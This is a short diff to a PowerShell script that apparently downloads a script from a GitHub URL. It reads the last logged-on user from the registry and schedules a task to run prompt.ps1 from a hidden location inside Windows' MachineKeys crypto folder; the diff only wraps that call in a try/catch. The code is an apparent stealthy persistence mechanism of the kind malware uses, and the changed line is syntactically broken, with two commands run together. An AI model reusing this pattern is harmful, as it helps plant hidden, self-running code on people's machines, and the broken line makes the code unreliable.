@@ -51,4 +51,13 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/user10327/zebrah/main/v
 
 $lastLoggedOnUserInfo = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI").LastLoggedOnUser
 $lastUser = $lastLoggedOnUserInfo.Split('\')[-1]
-Write-Output "Last logged-on user: $lastUser"CheckAndScheduleTask -ScriptPath "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1" -UserName $lastUser -TaskName "automated-ballsack-licker"
+
+try
+{
+    Write-Output "Last logged-on user: $lastUser"CheckAndScheduleTask -ScriptPath "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1" -UserName $lastUser -TaskName "automated-ballsack-licker"
+
+}
+catch
+{
+    Write-Error "checkandscheduletask failed: $_"
+}
